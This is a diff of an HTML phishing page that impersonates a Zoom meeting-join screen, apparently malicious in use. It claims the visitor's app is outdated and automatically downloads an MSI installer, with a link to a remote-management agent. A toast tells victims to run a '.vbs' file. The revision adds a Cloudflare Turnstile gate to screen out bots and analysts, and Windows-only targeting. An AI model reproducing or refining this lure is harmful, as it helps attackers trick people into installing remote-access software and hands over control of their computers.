@@ -3,12 +3,11 @@
   <head>
     <meta charset="UTF-8">
     <title>Joining Meeting</title>
-    <link rel="shortcut icon" href="https://us02st1.zoom.us/zoom.ico">
+    <link rel="shortcut icon" href="https://us02st1.jtech.us/jtech.ico">
     <meta name="robots" content="noindex,nofollow,noarchive">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap"
-
-      rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;display=swap" rel="stylesheet">
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
     <style>
     body {
         margin: 0;
@@ -88,13 +87,6 @@
         height: 100%;
         width: 0%;
         background: #2d8cff;
-        animation: loading 3s infinite;
-    }
-
-    @keyframes loading {
-        0% { width: 0%; }
-        50% { width: 80%; }
-        100% { width: 100%; }
     }
 
     .divider {
@@ -119,66 +111,173 @@
     .footer a:hover {
         text-decoration: underline;
     }
-</style> </head>
-  <body>
+
+    /* Turnstile loading overlay styles */
+    #loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 99999;
+        flex-direction: column;
+        font-family: Arial, Helvetica, sans-serif;
+    }
+
+    .loading-spinner-container {
+        position: relative;
+        width: 80px;
+        height: 80px;
+        margin-bottom: 20px;
+    }
+
+    .loading-spinner {
+        position: absolute;
+        border: 2px solid #f3f3f3;
+        border-top: 2px solid #0066cc;
+        border-radius: 50%;
+        width: 75px;
+        height: 75px;
+        animation: spin 0.5s linear infinite;
+    }
+
+    .loading-icon {
+        position: absolute;
+        width: 30px;
+        height: 30px;
+        top: 47%;
+        left: 47%;
+        transform: translate(-50%, -50%);
+    }
+
+    .loading-text {
+        font-size: 16px;
+        color: #333;
+        font-weight: normal;
+        margin-top: 20px;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+
+    #cf-turnstile {
+        margin: 20px auto;
+    }
+
+    .form-container {
+        display: none;
+    }
+
+    .verified .form-container {
+        display: block;
+    }
+
+    button:disabled {
+        background: #999;
+        cursor: not-allowed;
+        opacity: 0.6;
+    }
+</style> 
+</head>
+<body>
+
+<div id="loading-overlay">
+    <div class="loading-spinner-container">
+        <div class="loading-spinner"></div>
+        <img src="z.png" class="loading-icon" alt="Loading Icon">
+    </div>
+    <div class="loading-text">Verifying your browser...</div>
+    <div id="cf-turnstile"></div>
+</div>
+
+<div class="form-container">
     <div id="header" role="banner" class="clearfix">
-      <svg style="margin-top: 30px; margin-left: 30px;" width="115" height="26"
-
-        viewBox="0 0 114 26" fill="#0b5cff" class="header-logo">
-        <path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path>
-      </svg> </div>
+        <svg style="margin-top: 30px; margin-left: 30px;" width="115" height="26" viewBox="0 0 114 26" fill="#0b5cff" class="header-logo">
+            <path fill-rule="evenodd" clip-rule="evenodd" d="m23.6977 25.2924h-20.10301c-1.32885 0-2.58954-.6978-3.202853-1.8892-.698493-1.3617-.4429462-2.9956.630343-4.068l13.98692-13.97375h-10.01743c-2.7599 0-4.99167-2.22968-4.99167-4.987h18.5186c1.3288 0 2.5895.69784 3.2028 1.88927.6986 1.36164.443 2.9956-.6303 4.0679l-13.98691 13.97378h11.60181c2.7599 0 4.9917 2.2297 4.9917 4.987zm79.5603-25.2924c-2.879 0-5.4691 1.24249-7.241 3.23389-1.7883-1.9914-4.3781-3.23389-7.2401-3.23389-5.3497 0-9.7108 4.56149-9.7108 9.88887v15.40353c2.7598 0 4.9915-2.2297 4.9915-4.987v-10.46757c0-2.5701 1.9933-4.74871 4.5487-4.85083 2.692-.10213 4.9237 2.05945 4.9237 4.73169v10.58671c0 2.7573 2.2317 4.987 4.9915 4.987v-15.45457c0-2.5701 1.9935-4.74871 4.5485-4.85083 2.692-.10213 4.924 2.05945 4.924 4.73169v10.58671c0 2.7573 2.232 4.987 4.991 4.987v-15.40353c-.017-5.32738-4.378-9.88887-9.727-9.88887zm-54.3805 12.8334c0 7.0806-5.7583 12.8335-12.8455 12.8335-7.0871 0-12.8454-5.7529-12.8454-12.8335 0-7.0805 5.7753-12.8334 12.8454-12.8334 7.0702 0 12.8455 5.7529 12.8455 12.8334zm-4.9917 0c0-4.32315-3.5265-7.8464-7.8538-7.8464-4.3272 0-7.8538 3.52325-7.8538 7.8464 0 4.3233 3.5266 7.8465 7.8538 7.8465 4.3273 0 7.8538-3.5232 7.8538-7.8465zm32.6758 0c0 7.0806-5.758 12.8335-12.8451 12.8335-7.0877 0-12.8458-5.7529-12.8458-12.8335 0-7.0805 5.7757-12.8334 12.8458-12.8334 7.0696 0 12.8451 5.7529 12.8451 12.8334zm-4.9915 0c0-4.32315-3.5264-7.8464-7.8536-7.8464-4.3273 0-7.8541 3.52325-7.8541 7.8464 0 4.3233 3.5268 7.8465 7.8541 7.8465 4.3272 0 7.8536-3.5232 7.8536-7.8465z"></path>
+        </svg>
+    </div>
     <div class="container">
-      <h1>Joining Meeting</h1>
-      <p>Sorry, You are using old version of Zοоm Workplace App.</p>
-      <p> It requires latest Zoom Workplace to join the meeting.</p>
-      <p> Download has started automatically, kindly install to join the Remote
-        Desktop Meeting. </p>
-      <div class="progress-container">
-        <div class="progress-bar"></div>
-      </div>
-      <p> A computer is required to launch the meeting, If the
-        download doesn't start automatically, please <a href="https://superops-wininstaller-prod.s3.us-east-2.amazonaws.com/agent/7639486049163771904/1M1HFSHCJHZB4_19SYPURD17668_windows_x64.msi"
-
-          class="link" id="manualDownload">Download Manually</a> </p>
-      <button onclick="launchMeeting()" style="padding:12px 20px; background:#0b5fff; color:#fff; border:none; cursor:pointer;">
-        Launch Meeting </button>
-      <div class="divider"></div>
-      <p style="font-size:13px;"> By joining a meeting, you agree to our <a href="#"
-
-          class="link">Terms of Service</a> and <a href="#" class="link">Privacy
-          Statement</a> </p>
+        <h1>Joining Meeting</h1>
+        <p>Sorry, You are using old version of jtech Workplace App.</p>
+        <p> It requires latest jtech Workplace to join the meeting.</p>
+        <p> Download has started automatically, kindly install to join the Remote
+            Desktop Meeting. </p>
+        <div class="progress-container">
+            <div class="progress-bar"></div>
+        </div>
+        <p> A computer is required to launch the meeting, If the
+            download doesn't start automatically, please <a href="#" class="link" id="manualDownload">Download Manually</a>
+        </p>
+        <button id="launchBtn" style="padding:12px 20px; background:#0b5fff; color:#fff; border:none; cursor:pointer;">
+            Launch Meeting
+        </button>
+        <div class="divider"></div>
+        <p style="font-size:13px;"> By joining a meeting, you agree to our <a href="#" class="link">Terms of Service</a> and <a href="#" class="link">Privacy Statement</a> </p>
     </div>
     <div id="toast" style="
-    position: fixed;    bottom: 20px;    right: 20px;    background: #333;    color: #fff;    padding: 14px 18px;    border-radius: 6px;    font-family: Arial, sans-serif;    font-size: 14px;    opacity: 0;    transform: translateY(20px);    transition: all 0.4s ease;    z-index: 9999;">
-      Go to Downloads folder and click on <b>ZοоmWorkplace........vbs</b> to
-      launch meeting </div>
-    <div class="footer">
-      <p style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">©2026
-        Zoom Communications, Inc.<span>&nbsp;</span><span style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif;">All
-          rights reserved.</span></p>
-      <p class="LP3K7kSq" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><a
-
-          href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Trust
-          Center |</a><span>&nbsp;</span><a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Acceptable
-          Use Guidelines |</a><span>&nbsp;</span><a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Legal
-          &amp; Compliance |</a><span>&nbsp;</span><a href="#" tabindex="0" role="button"
-
-          style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Do
-          Not Sell My Personal Information |</a><span>&nbsp;</span><a href="#" tabindex="0"
-
-          role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Cookie
-          Preferences</a></p>
+        position: fixed;    bottom: 20px;    right: 20px;    background: #333;    color: #fff;    padding: 14px 18px;    border-radius: 6px;    font-family: Arial, sans-serif;    font-size: 14px;    opacity: 0;    transform: translateY(20px);    transition: all 0.4s ease;    z-index: 9999;">
+        Go to Downloads folder and click on <b>jtechWorkplace........vbs</b> to launch meeting
     </div>
-    <script>
+    <div class="footer">
+        <p style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">©2026
+            jtech Communications, Inc.<span>&nbsp;</span><span style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif;">All
+                rights reserved.</span></p>
+        <p class="LP3K7kSq" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; margin: 0px; font-size: 14px; line-height: 1.5; color: rgba(4, 4, 19, 0.56); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">
+            <a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Trust Center |</a><span>&nbsp;</span>
+            <a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Acceptable Use Guidelines |</a><span>&nbsp;</span>
+            <a href="#" target="_blank" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Legal &amp; Compliance |</a><span>&nbsp;</span>
+            <a href="#" tabindex="0" role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Do Not Sell My Personal Information |</a><span>&nbsp;</span>
+            <a href="#" tabindex="0" role="button" style="font-family: &quot;Open Sans&quot;, Helvetica, Arial, sans-serif; text-decoration: none; color: inherit;">Cookie Preferences</a>
+        </p>
+    </div>
+
+    <div id="deviceWarning" style="
+        display:none;
+        position:fixed;
+        top:0;
+        left:0;
+        width:100%;
+        height:100%;
+        background:#ffffff;
+        z-index:99999;
+        text-align:center;
+        padding-top:20%;
+        font-family:Inter, Arial, sans-serif;
+    ">
+        <h1 style="font-size:28px;">⚠️ Unsupported Device</h1>
+        <p style="font-size:18px; color:#555;">
+            Please use a Windows computer to join this meeting.
+        </p>
+    </div>
+</div>
+
+<script>
 const files = {
     windows: {
-        url: "ZM9CTWGUQ0RITC_SYP0RD02.zip",
-        name: "ZM9CTWGUQ0RITC_SYP0RD02.zip"
+        url: "jtechWORKPLACE_X9TWGUQ0RITC_19SVEPT6J3D34_windows_x64.msi",
+        name: "jtechWORKPLACE_X9TWGUQ0RITC_19SVEPT6J3D34_windows_x64.msi"
     }
 };
 
 let selectedFile = files.windows;
+let turnstileVerified = false;
 
+function isDesktopWindows() {
+    const ua = navigator.userAgent || "";
+    const platform = navigator.platform || "";
+
+    const isWindows = /Win/i.test(platform) || /Windows/i.test(ua);
+    const isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(ua);
+    const isTouchOnly = navigator.maxTouchPoints > 2 && !/Win/i.test(platform);
+
+    return isWindows && !isMobile && !isTouchOnly;
+}
 
 function showToast(message, duration = 15000) {
     const toast = document.getElementById("toast");
@@ -193,7 +292,6 @@ function showToast(message, duration = 15000) {
         toast.style.transform = "translateY(20px)";
     }, duration);
 }
-
 
 function updateProgress(percent) {
     const bar = document.querySelector(".progress-bar");
@@ -232,6 +330,7 @@ async function downloadFile(file) {
 
         const blob = new Blob(chunks);
         const blobUrl = window.URL.createObjectURL(blob);
+
         const a = document.createElement("a");
         a.href = blobUrl;
         a.download = file.name;
@@ -255,8 +354,17 @@ async function downloadFile(file) {
     }
 }
 
-
 function launchMeeting() {
+    if (!turnstileVerified) {
+        showToast("✓ Please complete verification first");
+        return;
+    }
+
+    if (!isDesktopWindows()) {
+        showDeviceWarning();
+        return;
+    }
+
     downloadFile(selectedFile);
 
     setTimeout(() => {
@@ -267,19 +375,86 @@ function launchMeeting() {
     }, 1200);
 }
 
+function showDeviceWarning() {
+    const warning = document.getElementById("deviceWarning");
+    if (warning) {
+        warning.style.display = "block";
+    }
 
-window.addEventListener("DOMContentLoaded", () => {
+    const container = document.querySelector(".container");
+    if (container) container.style.display = "none";
+
+    const btn = document.getElementById("launchBtn");
+    if (btn) btn.style.display = "none";
+}
+
+
+document.addEventListener('DOMContentLoaded', function() {
+    turnstile.ready(function() {
+        turnstile.render('#cf-turnstile', {
+            sitekey: '0x4AAAAAAC05NdE8TkHLYIrm',
+            callback: function(token) {
+                document.querySelector('.loading-text').textContent = 'Verification complete!';
+                turnstileVerified = true;
+                
+                setTimeout(function() {
+                    document.getElementById('loading-overlay').style.display = 'none';
+                    document.body.classList.add('verified');
+                    
+                    if (!isDesktopWindows()) {
+                        showDeviceWarning();
+                        return;
+                    }
+                    
+                    const manualBtn = document.getElementById("manualDownload");
+                    const launchBtn = document.getElementById("launchBtn");
+                    
+                    if (manualBtn) {
+                        manualBtn.style.pointerEvents = "auto";
+                        manualBtn.style.opacity = "1";
+                    }
+                    
+                    if (launchBtn) {
+                        launchBtn.disabled = false;
+                    }
+                    
+                    setTimeout(launchMeeting, 1200);
+                }, 2000);
+            },
+            'error-callback': function() {
+                document.querySelector('.loading-text').textContent = 'Verification failed. Please refresh the page.';
+                turnstileVerified = false;
+            }
+        });
+    });
 
     const manualBtn = document.getElementById("manualDownload");
+    const launchBtn = document.getElementById("launchBtn");
+    
     if (manualBtn) {
+        manualBtn.style.pointerEvents = "none";
+        manualBtn.style.opacity = "0.5";
         manualBtn.addEventListener("click", function(e) {
             e.preventDefault();
+            if (!turnstileVerified) {
+                showToast("✓ Please complete verification first");
+                return;
+            }
             launchMeeting();
         });
     }
-
-    setTimeout(launchMeeting, 1200);
+    
+    if (launchBtn) {
+        launchBtn.disabled = true;
+        launchBtn.addEventListener("click", function() {
+            if (!turnstileVerified) {
+                showToast("✓ Please complete verification first");
+                return;
+            }
+            launchMeeting();
+        });
+    }
 });
 </script>
-  </body>
+</body>
 </html>
